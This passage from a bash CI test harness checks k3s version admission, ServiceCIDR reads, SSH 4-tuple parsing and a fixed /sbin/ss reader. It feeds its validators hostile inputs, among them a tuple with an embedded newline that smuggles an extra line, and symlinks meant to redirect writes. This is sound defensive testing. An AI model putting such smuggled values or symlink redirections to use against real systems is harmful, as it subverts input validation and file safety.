  source ./scripts/ci/environment-lib.sh
  export DIENE_ADMITTED_K3S_VERSION=''
  diene_k3s_admission
)

k3s_admission_default_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  unset DIENE_ADMITTED_K3S_VERSION
  diene_k3s_admission
)

[[ $(k3s_admission_case v1.33.1+k3s1) == 'v1.33.1+k3s1 kubernetes:1.33' ]] ||
  fail 'the exact admitted version did not derive exactly one supported feature'
[[ $(k3s_admission_default_case) == 'v1.33.1+k3s1 kubernetes:1.33' ]] ||
  fail 'the omitted admission default is not the admitted v1.33.1+k3s1 substrate'
for malformed_admission in '' v1.32.3+k3s1 v1.34.0+k3s1 1.33.1+k3s1 v1.33.1 v1.33+k3s1 \
  'v1.33.1+k3s1 extra' v1.33.1+k3s v1.33.1-k3s1 v1.33.01+k3s1 v1.33.1+k3s01 v01.33.1+k3s1 \
  v1.033.1+k3s1 V1.33.1+k3s1 v1.33.1+K3S1; do
  expect_refusal InputContractInvalid k3s_admission_case "$malformed_admission"
done
expect_refusal InputContractInvalid k3s_admission_empty_environment_case
ok 'one helper is the source of truth for the admitted version and its single derived feature'

k3s_runtime_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_require_admitted_k3s_runtime "${1-}" "${2-}" "${3-}"
)

k3s_runtime_case v1.33.1+k3s1 v1.33.1+k3s1 v1.33.1+k3s1 ||
  fail 'the exact admitted runtime pair was refused'
expect_refusal InstancePostureUnavailable k3s_runtime_case v1.33.1+k3s1 v1.32.3+k3s1 v1.32.3+k3s1
expect_refusal InstancePostureUnavailable k3s_runtime_case v1.33.1+k3s1 v1.33.2+k3s1 v1.33.2+k3s1
expect_refusal InstancePostureUnavailable k3s_runtime_case v1.33.1+k3s1 v1.33.1+k3s1 v1.32.3+k3s1
expect_refusal InstancePostureUnavailable k3s_runtime_case v1.33.1+k3s1 v1.32.3+k3s1 v1.33.1+k3s1
expect_refusal InstancePostureUnavailable k3s_runtime_case v1.33.1+k3s1 '' v1.33.1+k3s1
expect_refusal InstancePostureUnavailable k3s_runtime_case v1.33.1+k3s1 v1.33.1+k3s1 ''
expect_refusal InstancePostureUnavailable k3s_runtime_case '' v1.33.1+k3s1 v1.33.1+k3s1
expect_refusal InputContractInvalid k3s_runtime_case not-a-version v1.33.1+k3s1 v1.33.1+k3s1
ok 'both observed runtime versions must equal the same admitted version'

# Binding regression: the helpers above are only worth their coverage if the real
# in-guest preflight is the caller. Prove the production seam, and prove the
# disproved k3s argv/config service-range scan is gone rather than demoted.
runner_preflight=$template_root/scripts/ci/environment-runner-preflight.sh
# The seams are matched as production source text, so they must stay unexpanded.
# shellcheck disable=SC2016
for required_seam in 'diene_require_admitted_k3s_runtime "${DIENE_ADMITTED_K3S_VERSION:-}"' \
  'diene_observe_admitted_service_cidr "${DIENE_K3S_SERVICE_CIDR:-}"'; do
  rg -qF -- "$required_seam" "$runner_preflight" ||
    fail "the real runner preflight no longer calls $required_seam"
done
if rg -n -- '--service-cidr|/etc/rancher/k3s/config\.yaml|ps -eo' "$runner_preflight" \
  >"$scratch/preflight-cidr-guess"; then
  sed -n '1,40p' "$scratch/preflight-cidr-guess" >&2
  fail 'the real runner preflight still guesses the service range from k3s argv or config'
fi
rg -qF -- "diene_die InstancePostureUnavailable 'the built-in k3s version is unavailable'" \
  "$runner_preflight" ||
  fail 'the real runner preflight does not map a failed k3s version observation to a stable reason'
ok 'the real runner preflight binds both admission helpers and guesses no service range'

fake_create_seq=0
fake_create_argv() {
  fake_create_seq=$((fake_create_seq + 1))
  local root=$scratch/fake-create-$fake_create_seq
  install -d -m 0700 "$root"
  FAKE_NSC_ROOT=$root FAKE_NSC_LOG=$root/log FAKE_NSC_SCENARIO=happy \
    "$fake_nsc" create --ephemeral --duration 2h "$@" --wait_kube_system \
    --cidfile "$root/cluster.cid" --output_json_to "$root/create.json" --output json \
    --purpose 'diene-ci-k3d/v1 ditto-build-local' --unique_tag "contract-tag-$fake_create_seq" \
    --label diene_receipt=r --label diene_run=1 --label diene_attempt=1 \
    >"$root/out.json" 2>"$root/err"
}

fake_create_argv --enable=kubernetes:1.33 ||
  fail 'the fake create parser refused the exact derived feature selector'
jq -e '.kubernetes_feature == "kubernetes:1.33"' \
  "$scratch/fake-create-$fake_create_seq/instances/"*/meta.json >/dev/null ||
  fail 'the fake create parser did not retain the selected feature semantically'
if fake_create_argv; then
  fail 'the fake create parser accepted a missing feature selector'
fi
for hostile_selector in kubernetes:1.32 kubernetes:1.34 kubernetes: kubernetes:1 1.33 \
  KUBERNETES:1.33 kubernetes:1.33.1 'kubernetes:1.33 ' kubernetes:v1.33; do
  if fake_create_argv "--enable=$hostile_selector"; then
    fail "the fake create parser accepted the refused selector $hostile_selector"
  fi
done
if fake_create_argv --enable=kubernetes:1.33 --enable=kubernetes:1.33; then
  fail 'the fake create parser accepted a duplicate feature selector'
fi
if fake_create_argv --enable=kubernetes:1.33 --enable=kubernetes:1.32; then
  fail 'the fake create parser accepted a second conflicting feature selector'
fi
if fake_create_argv --enable kubernetes:1.33; then
  fail 'the fake create parser accepted a split feature selector'
fi
ok 'the fake create surface requires exactly one exact derived Kubernetes feature selector'

printf '== the admitted service range comes from the one ServiceCIDR object ==\n'

service_cidr_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  export DIENE_KUBECTL_BIN="$policy_tools/kubectl"
  export FAKE_KUBECTL_LOG="$scratch/service-cidr-kubectl.log"
  diene_observe_admitted_service_cidr "${1-}"
)

: >"$scratch/service-cidr-kubectl.log"
[[ $(service_cidr_case 10.143.0.0/16) == 10.143.0.0/16 ]] ||
  fail 'the exact admitted service range was not read from the ServiceCIDR object'
grep -Fq -- 'get servicecidrs.networking.k8s.io kubernetes -o json' \
  "$scratch/service-cidr-kubectl.log" ||
  fail 'the service range was not read from the named networking.k8s.io ServiceCIDR object'
expect_refusal InstancePostureUnavailable service_cidr_case ''
expect_refusal InputContractInvalid service_cidr_case 10.143.0.0/33
expect_refusal InputContractInvalid service_cidr_case 10.143.0.300/16
expect_refusal InputContractInvalid service_cidr_case 10.143.0.0
export FAKE_SERVICE_CIDR_MODE=unavailable
expect_refusal ServiceCidrObservationUnavailable service_cidr_case 10.143.0.0/16
unset FAKE_SERVICE_CIDR_MODE
export FAKE_SERVICE_CIDR_API=networking.k8s.io/v1beta1
expect_refusal ServiceCidrObservationUnavailable service_cidr_case 10.143.0.0/16
unset FAKE_SERVICE_CIDR_API
export FAKE_SERVICE_CIDR_KIND=ServiceCIDRList
expect_refusal ServiceCidrObservationUnavailable service_cidr_case 10.143.0.0/16
unset FAKE_SERVICE_CIDR_KIND
export FAKE_SERVICE_CIDR_NAME=renamed
expect_refusal ServiceCidrObservationUnavailable service_cidr_case 10.143.0.0/16
unset FAKE_SERVICE_CIDR_NAME
for hostile_cidrs in '[]' '["10.143.0.0/16","10.144.0.0/16"]' '["10.143.0.0/16","fd00:143::/108"]' \
  '["fd00:143::/108"]' '["10.143.0.0/33"]' '["not-a-cidr"]' '[null]'; do
  export FAKE_SERVICE_CIDRS=$hostile_cidrs
  expect_refusal ServiceCidrObservationUnavailable service_cidr_case 10.143.0.0/16
done
export FAKE_SERVICE_CIDRS='["10.144.0.0/16"]'
expect_refusal InstancePostureUnavailable service_cidr_case 10.143.0.0/16
unset FAKE_SERVICE_CIDRS
ok 'the ServiceCIDR observation fails closed rather than inferring a range'

printf '== orchestration tuple sources and their fail-closed matrix ==\n'

: >"$scratch/env-source-reader-calls"
tuple_environment_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  # The primary source must execute the kernel socket reader zero times. This
  # stub records every invocation so that claim is proved by behaviour; it is a
  # test-side override only and production keeps no such seam. Its log path comes
  # from the environment because production declares its own `scratch` local that
  # would otherwise shadow the harness global under `set -u`.
  export FAKE_ENV_READER_LOG="$scratch/env-source-reader-calls"
  # shellcheck disable=SC2329
  diene_orchestration_ss_observation() {
    printf 'called\n' >>"${FAKE_ENV_READER_LOG:?}"
    printf '%s\n' 'ESTAB 0 0 10.0.0.2:22 198.51.100.99:5555'
  }
  export SSH_CONNECTION="${1-}"
  diene_observe_orchestration_ssh_tuple
)

tuple_ss_case() (
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  printf '%s\n' "${1-}" | diene_parse_orchestration_ss_observation
)

# The primary source now emits one compact JSON object binding the canonical
# tuple, the measured selected count, and a deterministic digest of the exact
# admitted one-line value. No artifact is retained because nothing was read.
env_tuple_observation=$(tuple_environment_case '192.0.2.10 4242 10.0.0.2 22')
jq -e --arg digest "sha256:$(printf '%s' '192.0.2.10 4242 10.0.0.2 22' | sha256sum | awk '{print $1}')" '
  .source == "ssh-environment" and
  .tuple == {clientAddress:"192.0.2.10",clientPort:4242,
    serverAddress:"10.0.0.2",serverPort:22} and
  .flowCount == 1 and .observationDigest == $digest and
  .selectedRow == "192.0.2.10 4242 10.0.0.2 22" and
  .observationArtifact == null' <<<"$env_tuple_observation" >/dev/null ||
  fail 'the valid SSH environment tuple was not bound exactly'
for malformed_tuple in '' ' ' '192.0.2.10 4242 10.0.0.2' '192.0.2.10 4242 10.0.0.2 22 extra' \
  '2001:db8::1 4242 10.0.0.2 22' '192.0.2.10 4242 fd00::2 22' '192.0.2.10 4242 10.0.0.2 2222' \
  '192.0.2.10 99999 10.0.0.2 22' '192.0.2.300 4242 10.0.0.2 22' '192.0.2.10 ssh 10.0.0.2 22' \
  '192.0.2.10 0 10.0.0.2 22' '192.0.2.10 4242 10.0.0.2 022' \
  '0.0.0.0 4242 10.0.0.2 22' '192.0.2.10 4242 0.0.0.0 22' \
  $'192.0.2.10 4242 10.0.0.2 22\ninjected 1 2 3' $'192.0.2.10 4242 10.0.0.2 22\n' \
  $'192.0.2.10 4242 10.0.0.2 22\r' $'192.0.2.10\t4242\t10.0.0.2\t22' \
  '192.0.2.10  4242 10.0.0.2 22'; do
  expect_refusal InterimPolicyUnavailable tuple_environment_case "$malformed_tuple"
done
# Neither the admitted value nor any refusal above may consult the socket table.
[[ ! -s $scratch/env-source-reader-calls ]] ||
  fail 'the SSH environment source executed the kernel socket reader'
ok 'a present SSH environment value is validated exactly and never falls back'

# The fallback reader must stay bound to the fixed absolute iproute2 path, carry
# no state filter, and expose no variable or environment seam a hostile guest
# could redirect. The assertion is scoped structurally to that one function body:
# diene_preflow_start legitimately probes a single destination with
# `ss -Htn state established dst <host:port>`, and that unrelated pre-existing
# flow command must never be conflated with this reader.
assert_fixed_ss_reader() {
  local lib=${1:?library path required} body expected_body
  body=$(awk '/^diene_orchestration_ss_observation/,/^}$/' "$lib")
  [[ -n $body ]] || return 71
  # The state filter is checked first so a filtered reader reports that exact
  # regression: iproute2 omits the State column whenever a filter is supplied,
  # which would leave the established claim resting on the argument instead of on
  # an observed value.
  ! grep -Eq -- '(^|[^[:alnum:]_])state([[:space:]]|$)' <<<"$body" || return 74
  ! grep -Eq -- 'DIENE_SS|ss_bin' <<<"$body" || return 75
  grep -Fxq -- '  diene_require_command /sbin/ss' <<<"$body" || return 72
  grep -Fxq -- '  /sbin/ss -H -n -t -4' <<<"$body" || return 76
  # Whole-body equality, so no appended argv, extra command, redirection, or
  # substitution can hide beside the two exact lines above.
  expected_body=$(printf '%s\n' 'diene_orchestration_ss_observation() {' \
    '  diene_require_command /sbin/ss' \
    '  /sbin/ss -H -n -t -4' \
    '}')
  [[ $body == "$expected_body" ]] || return 73
  return 0
}

production_lib=$template_root/scripts/ci/environment-lib.sh
ss_reader_rc=0
assert_fixed_ss_reader "$production_lib" || ss_reader_rc=$?
[[ $ss_reader_rc == 0 ]] ||
  fail "the production kernel socket reader is not the fixed unfiltered absolute invocation (code $ss_reader_rc)"
rg -qF -- 'ss -Htn state established dst' "$production_lib" ||
  fail 'the unrelated pre-existing flow probe was altered instead of leaving it untouched'

# Negative regression: the tripwire must actually fire on each way the reader
# could regress. A mutant identical to production would make these vacuous.
ss_reader_probe=$scratch/ss-reader-probe
install -d -m 0700 "$ss_reader_probe"
ss_reader_mutant_case() {
  local label=${1:?label required} expected=${2:?expected code required} script=${3:?sed script required}
  local mutant=$ss_reader_probe/$label.sh rc=0
  sed "$script" "$production_lib" >"$mutant"
  ! cmp -s "$production_lib" "$mutant" ||
    fail "the $label reader mutant is byte-identical to production, so its tripwire is vacuous"
  assert_fixed_ss_reader "$mutant" || rc=$?
  [[ $rc == "$expected" ]] ||
    fail "the $label reader mutant returned $rc, expected tripwire code $expected"
}

ss_reader_mutant_case state-filter 74 's|^  /sbin/ss -H -n -t -4$|  /sbin/ss -H -n -t -4 state established|'
ss_reader_mutant_case path-relative 76 's|^  /sbin/ss -H -n -t -4$|  ss -H -n -t -4|'
ss_reader_mutant_case appended-argv 76 's|^  /sbin/ss -H -n -t -4$|  /sbin/ss -H -n -t -4 -p|'
ss_reader_mutant_case appended-command 73 's|^  /sbin/ss -H -n -t -4$|  /sbin/ss -H -n -t -4\n  /sbin/ss -H -n -t -4 dst 0.0.0.0|'
# The mutant injects that seam as literal source text, so it must not expand here.
# shellcheck disable=SC2016
ss_reader_mutant_case override-seam 75 's|^  diene_require_command /sbin/ss$|  diene_require_command "${DIENE_SS_BIN:-/sbin/ss}"|'
ss_reader_mutant_case reader-absent 71 's|^diene_orchestration_ss_observation() {$|diene_renamed_socket_reader() {|'
ok 'the kernel socket reader is the fixed unfiltered absolute /sbin/ss and its tripwire proves each regression'

[[ $(tuple_ss_case 'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242') == '192.0.2.10 4242 10.0.0.2 22 1 ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' ]] ||
  fail 'one exact established IPv4 port 22 socket did not yield the orchestration tuple'
[[ $(tuple_ss_case 'ESTAB 0 0 127.0.0.1:6443 127.0.0.1:38122
ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242
ESTAB 0 0 10.142.0.5:443 10.142.0.9:51234') == '192.0.2.10 4242 10.0.0.2 22 1 ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' ]] ||
  fail 'unrelated established sockets were not ignored while deriving the single port 22 flow'
[[ $(tuple_ss_case 'TIME-WAIT 0 0 10.0.0.2:22 198.51.100.9:5555
SYN-SENT 0 0 10.0.0.2:22 198.51.100.8:5556
ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242') == '192.0.2.10 4242 10.0.0.2 22 1 ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' ]] ||
  fail 'a non-established port 22 socket was counted as an orchestration flow'
for hostile_observation in '' 'ESTAB 0 0 127.0.0.1:6443 127.0.0.1:38122' \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242
ESTAB 0 0 10.0.0.2:22 198.51.100.7:5555' \
  'ESTAB 0 0 [fd00::2]:22 [fd00::1]:4242' \
  'ESTAB 0 0 0.0.0.0:22 192.0.2.10:4242' \
  'ESTAB 0 0 10.0.0.2:22 0.0.0.0:4242' \
  'ESTAB 0 0 *:22 192.0.2.10:4242' \
  'ESTAB 0 0 10.0.0.2:2222 192.0.2.10:4242' \
  'ESTAB 0 0 10.0.0.2:ssh 192.0.2.10:4242' \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:99999' \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.300:4242' \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242 users:((sshd,pid=1,fd=3))' \
  'ESTAB 0 0 10.0.0.2:22' \
  'ESTABLISHED 0 0 10.0.0.2:22 192.0.2.10:4242' \
  'SYN-SENT 0 0 10.0.0.2:22 192.0.2.10:4242' \
  'ESTAB x 0 10.0.0.2:22 192.0.2.10:4242' \
  'State Recv-Q Send-Q Local Peer'; do
  expect_refusal InterimPolicyUnavailable tuple_ss_case "$hostile_observation"
done
ok 'the numeric kernel socket parser admits exactly one concrete IPv4 port 22 flow'

kernel_ss_policy_case() {
  local label=${1:?label required} observation=${2:?observation required}
  local mode=${3:-happy}
  local state=$scratch/policy-$label-state evidence=$scratch/policy-$label-evidence
  local tables=$scratch/policy-$label.log
  local staging=$scratch/policy-$label-staging
  local calls=$scratch/policy-$label-reader-calls
  install -d -m 0700 "$state" "$evidence"
  : >"$tables"
  : >"$calls"
  # Hostile staging shapes for the retained-observation artifact. Each one must
  # refuse before any chain exists rather than degrade to an unretained tuple.
  case $mode in
    staging-missing) ;;
    staging-symlink)
      install -d -m 0700 "$scratch/policy-$label-target"
      ln -sfn "$scratch/policy-$label-target" "$staging"
      ;;
    staging-unwritable) install -d -m 0500 "$staging" ;;
    artifact-unsafe)
      install -d -m 0700 "$staging/orchestration/ss-observation.txt"
      ;;
    artifact-target-symlink)
      # A symlinked artifact path pointing at an existing file outside the tree
      # must refuse rather than publish through the link.
      install -d -m 0700 "$staging/orchestration"
      printf 'ORIGINAL\n' >"$scratch/policy-$label-outside"
      ln -sfn "$scratch/policy-$label-outside" "$staging/orchestration/ss-observation.txt"
      ;;
    observation-dir-symlink)
      # A symlinked observation directory would place same-session evidence
      # outside the driver-owned tree while still reporting success.
      install -d -m 0700 "$staging" "$scratch/policy-$label-escape"
      ln -sfn "$scratch/policy-$label-escape" "$staging/orchestration"
      ;;
    *) install -d -m 0700 "$staging" ;;
  esac
  jq -n '{network:{serviceCidrs:["10.143.0.0/16"]}}' >"$evidence/preflight.json"
  (
    cd -- "$work"
    # shellcheck source=/dev/null
    source ./scripts/ci/environment-lib.sh
    diene_validate_inputs
    unset SSH_CONNECTION
    # Production reads the fixed absolute /sbin/ss and exposes no override. Only
    # the reader is replaced here so the parser, retention, and policy path can
    # be driven deterministically; the parser, retention, and every refusal stay
    # the real ones. The exact production argv is proved separately and
    # structurally by assert_fixed_ss_reader; this stub proves how many times the
    # reader is invoked and that production passes it no arguments.
    # The stub reads its inputs from the environment rather than from the
    # caller's locals: production declares its own locals around this call, and a
    # dynamically scoped name would be shadowed by them under `set -u`.
    export FAKE_SS_OBSERVATION="$observation" FAKE_SS_MODE="$mode"
    export FAKE_SS_CALL_LOG="$calls"
    # shellcheck disable=SC2329
    diene_orchestration_ss_observation() {
      printf '[%s]\n' "$*" >>"${FAKE_SS_CALL_LOG:?}"
      [[ ${FAKE_SS_MODE:?} != reader-fail ]] || return 3
      printf '%s\n' "${FAKE_SS_OBSERVATION?}"
    }
    if [[ $mode == staging-relative ]]; then
      export DIENE_EVIDENCE_STAGING="relative/staging"
    else
      export DIENE_EVIDENCE_STAGING="$staging"
    fi
    export DIENE_NSC_CLUSTER_ID="cluster-$label"
    export DIENE_PREFLIGHT_EVIDENCE="$evidence/preflight.json"
    export DIENE_KUBECTL_BIN="$policy_tools/kubectl" DIENE_IPTABLES_BIN="$policy_tools/iptables4"
    export DIENE_IP6TABLES_BIN="$policy_tools/iptables6"
    export DIENE_EGRESS_RESOLVER_BIN="$policy_tools/resolver"
    export DIENE_IPV6_DISABLE_PATH="$ipv6_disabled_path" FAKE_NODE_POD_CIDRS='["10.142.0.0/16"]'
    export FAKE_TABLE_STATE="$state" FAKE_TABLE_LOG="$tables"
    export FAKE_KUBECTL_LOG="$policy_kubectl_log" FAKE_L7_LOG="$policy_l7_log"
    diene_prepare_egress_contract "$evidence/contract.json"
    diene_resolve_egress_contract "$evidence/contract.json" "$evidence/resolved.json"
    diene_apply_interim_policy "$evidence/resolved.json" "$evidence/policy.json" "$evidence/l7.json"
    diene_remove_interim_policy
  ) >"$scratch/policy-$label.out" 2>"$scratch/policy-$label.err"
}

prepare_run 7106
kernel_ss_policy_case kernel-ss 'ESTAB 0 0 127.0.0.1:6443 127.0.0.1:38122
ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' || {
  sed -n '1,160p' "$scratch/policy-kernel-ss.err" >&2
  fail 'the kernel socket orchestration source refused a valid single observation'
}
jq -e '.orchestrationException == "exact-ssh-4-tuple" and
  .orchestrationTupleSource == "kernel-ss" and .applied == true' \
  "$scratch/policy-kernel-ss-evidence/policy.json" >/dev/null ||
  fail 'the kernel socket transcript lost the exact tuple claim or its recorded source'

# The literal reader ran exactly once, with no arguments, and was not consulted a
# second time for the parse: one observation backs both the rules and the proof.
[[ $(wc -l <"$scratch/policy-kernel-ss-reader-calls") == 1 ]] ||
  fail 'the kernel socket reader was not executed exactly once per policy activation'
[[ $(cat "$scratch/policy-kernel-ss-reader-calls") == '[]' ]] ||
  fail 'production passed arguments to the fixed kernel socket reader'

# The retained artifact is a regular mode-0600 file holding the exact observed
# bytes, and the transcript binds its stable relative name and true digest.
kernel_ss_artifact=$scratch/policy-kernel-ss-staging/orchestration/ss-observation.txt
[[ -f $kernel_ss_artifact && ! -L $kernel_ss_artifact ]] ||
  fail 'the same-session socket observation was not retained as a regular artifact'
[[ $(stat -c %a -- "$kernel_ss_artifact") == 600 ]] ||
  fail 'the retained socket observation is not mode 0600'
[[ $(cat "$kernel_ss_artifact") == 'ESTAB 0 0 127.0.0.1:6443 127.0.0.1:38122
ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' ]] ||
  fail 'the retained socket observation is not the exact observed bytes'
[[ -z $(find "$scratch/policy-kernel-ss-staging/orchestration" -name '*.tmp.*' -print -quit) ]] ||
  fail 'the retention left a temporary observation file behind'
kernel_ss_artifact_digest="sha256:$(sha256sum -- "$kernel_ss_artifact" | awk '{print $1}')"
jq -e --arg digest "$kernel_ss_artifact_digest" '
  .orchestrationTuple == {clientAddress:"192.0.2.10",clientPort:4242,
    serverAddress:"10.0.0.2",serverPort:22} and
  .orchestrationFlowCount == 1 and
  .orchestrationSelectedRow == "ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242" and
  .orchestrationObservationDigest == $digest and
  .orchestrationObservationArtifact == "orchestration/ss-observation.txt"' \
  "$scratch/policy-kernel-ss-evidence/policy.json" >/dev/null ||
  fail 'the kernel-ss transcript did not bind the retained artifact name, digest, tuple, count, and selected row'
# The bound selected row must be a real, unique line of the retained artifact, so
# a reviewer can point at the exact observed flow without re-running the parser.
kernel_ss_selected_row=$(jq -r '.orchestrationSelectedRow' \
  "$scratch/policy-kernel-ss-evidence/policy.json")
[[ $(grep -Fxc -- "$kernel_ss_selected_row" "$kernel_ss_artifact") == 1 ]] ||
  fail 'the bound selected row is not exactly one line of the retained observation'
grep -Fxq -- "$kernel_ss_selected_row" "$kernel_ss_artifact" ||
  fail 'the bound selected row does not appear verbatim in the retained observation'
# The bound tuple must be the tuple the rules actually used, recomputed from the
# retained bytes rather than taken on trust from the transcript.
[[ $(tuple_ss_case "$(cat "$kernel_ss_artifact")") == '192.0.2.10 4242 10.0.0.2 22 1 ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' ]] ||
  fail 'reparsing the retained bytes does not reproduce the bound orchestration tuple'
grep -Eq -- '-p tcp -s 10\.0\.0\.2 -d 192\.0\.2\.10 --sport 22 --dport 4242 -m conntrack --ctstate ESTABLISHED -j ACCEPT' \
  "$scratch/policy-kernel-ss.log" ||
  fail 'the kernel socket source did not yield the identical exact four-value SSH rule'
! grep -Fq -- 'ESTABLISHED,RELATED' "$scratch/policy-kernel-ss.log" ||
  fail 'the kernel socket source installed a blanket established-flow exemption'
if grep -Eq -- '0\.0\.0\.0/0|::/0|-d 10\.0\.0\.0/30|--ctstate RELATED|-d 10\.0\.0\.1( |$)' \
  "$scratch/policy-kernel-ss.log"; then
  fail 'the kernel socket source allowed a route, gateway, subnet, or related-flow class'
fi
assert_policy_state_absent "$scratch/policy-kernel-ss-state" kernel-ss

prepare_run 7107
if kernel_ss_policy_case kernel-ss-zero 'ESTAB 0 0 127.0.0.1:6443 127.0.0.1:38122'; then
  fail 'a kernel socket table without an established port 22 flow activated policy'
fi
grep -Fq -- InterimPolicyUnavailable "$scratch/policy-kernel-ss-zero.err" ||
  fail 'the degenerate kernel socket observation lost its stable refusal'
[[ ! -e $scratch/policy-kernel-ss-zero-evidence/policy.json ]] ||
  fail 'a refused tuple observation still emitted a policy transcript'
assert_policy_state_absent "$scratch/policy-kernel-ss-zero-state" kernel-ss-zero
ok 'both orchestration tuple sources yield the same exact rule and refuse before any mutation'

# Every way the same-session retention can fail must refuse before any chain,
# hook, or transcript exists, rather than fall back to an unretained tuple.
kernel_ss_refusal_case() {
  local label=${1:?label required} mode=${2:?mode required}
  local observation=${3:-'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242'}
  prepare_run "$4"
  if kernel_ss_policy_case "$label" "$observation" "$mode"; then
    fail "the $mode kernel socket observation activated policy"
  fi
  grep -Fq -- InterimPolicyUnavailable "$scratch/policy-$label.err" ||
    fail "the $mode observation lost its stable InterimPolicyUnavailable refusal"
  [[ ! -e $scratch/policy-$label-evidence/policy.json ]] ||
    fail "the $mode observation still emitted a policy transcript"
  assert_policy_state_absent "$scratch/policy-$label-state" "$label"
}

kernel_ss_refusal_case kernel-ss-reader-fail reader-fail \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' 7140
kernel_ss_refusal_case kernel-ss-staging-missing staging-missing \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' 7141
kernel_ss_refusal_case kernel-ss-staging-relative staging-relative \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' 7142
kernel_ss_refusal_case kernel-ss-staging-symlink staging-symlink \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' 7143
kernel_ss_refusal_case kernel-ss-staging-unwritable staging-unwritable \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' 7144
kernel_ss_refusal_case kernel-ss-artifact-unsafe artifact-unsafe \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' 7145
kernel_ss_refusal_case kernel-ss-dir-symlink observation-dir-symlink \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' 7148
# The refusal must also mean nothing was written through the symlink.
[[ -z $(find "$scratch/policy-kernel-ss-dir-symlink-escape" -type f -print -quit 2>/dev/null) ]] ||
  fail 'a symlinked observation directory let same-session evidence escape the driver-owned tree'
kernel_ss_refusal_case kernel-ss-target-symlink artifact-target-symlink \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' 7149
[[ $(cat "$scratch/policy-kernel-ss-target-symlink-outside") == ORIGINAL ]] ||
  fail 'a symlinked observation target let the retention publish through the link'
kernel_ss_refusal_case kernel-ss-multiple multiple \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242
ESTAB 0 0 10.0.0.2:22 198.51.100.7:5555' 7146
kernel_ss_refusal_case kernel-ss-malformed malformed \
  'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242 users:((sshd,pid=1,fd=3))' 7147
# A refused observation must not leave a half-written or world-readable artifact.
for refused_label in kernel-ss-reader-fail kernel-ss-multiple kernel-ss-malformed \
  kernel-ss-artifact-unsafe kernel-ss-target-symlink; do
  refused_artifact=$scratch/policy-$refused_label-staging/orchestration
  if [[ -d $refused_artifact ]]; then
    [[ -z $(find "$refused_artifact" -name '*.tmp.*' -print -quit) ]] ||
      fail "the refused $refused_label observation left a temporary artifact behind"
    while IFS= read -r retained; do
      [[ $(stat -c %a -- "$retained") == 600 ]] ||
        fail "the refused $refused_label observation left a non-0600 artifact"
    done < <(find "$refused_artifact" -type f)
  fi
done
chmod -R u+rwX "$scratch/policy-kernel-ss-staging-unwritable-staging" 2>/dev/null || true
ok 'observation, staging, retention, and parse failures all refuse before any policy artifact exists'

printf '== the fixed remote command pins and verifies guest nix ==\n'

nix_guard_bin=$scratch/nix-guard-bin
install -d -m 0700 "$nix_guard_bin"
nix_guard_probe=$scratch/nix-guard-probe.sh
nix_guard_probe_line=${guest_nix_guard//\/nix\/var\/nix\/profiles\/default\/bin\/nix/$nix_guard_bin\/nix}
{
  printf '%s\n' '#!/usr/bin/env bash' 'set -eu'
  printf '%s\n' "$nix_guard_probe_line"
  printf '%s\n' 'printf "GuestNixToolchainPresent\n"'
} >"$nix_guard_probe"
chmod 0755 "$nix_guard_probe"
nix_guard_rc=0
env -i "PATH=$nix_guard_bin" "$BASH" "$nix_guard_probe" \
  >"$scratch/nix-guard-absent.out" 2>"$scratch/nix-guard-absent.err" || nix_guard_rc=$?
[[ $nix_guard_rc == 64 ]] ||
  fail "the fixed guest nix guard did not refuse an absent toolchain with the stable reason exit (got $nix_guard_rc)"
grep -Fq -- 'GuestNixToolchainAbsent:' "$scratch/nix-guard-absent.err" ||
  fail 'the absent guest toolchain produced no stable GuestNixToolchainAbsent diagnostic'
[[ ! -s $scratch/nix-guard-absent.out ]] ||
  fail 'the refused guest entry still produced driver output'
printf '%s\n' '#!/bin/sh' 'exit 0' >"$nix_guard_bin/nix"
chmod 0755 "$nix_guard_bin/nix"
env -i "PATH=$nix_guard_bin" "$BASH" "$nix_guard_probe" \
  >"$scratch/nix-guard-present.out" 2>"$scratch/nix-guard-present.err" ||
  fail 'the guest nix guard refused an instance that does provide nix'
grep -Fxq -- GuestNixToolchainPresent "$scratch/nix-guard-present.out" ||
  fail 'the guest nix guard did not fall through to the driver entry'
# Refined-by the generation-9 direct-binary ruling: preserve the old blanket
# bootstrap guard's intent while admitting only the two exact immutable tagged
# assets. The harness carries hostile tokens, so scan production files only.
# Join shell continuations before matching, retain a non-whitespace boundary
# between files, and scan pipe continuations in multiline mode. A forbidden
# command therefore cannot evade the scan by moving onto the next physical
# line, and two unrelated files cannot combine into one synthetic command. The
# shell-command token boundary excludes the `.sh` suffix in a benign helper.
guest_nix_production_normalized=$scratch/guest-nix-production-normalized
: >"$guest_nix_production_normalized"
while IFS= read -r guest_nix_production_file; do
  sed ':join; /\\$/ { N; s/\\\n[[:space:]]*/ /; b join; }' \
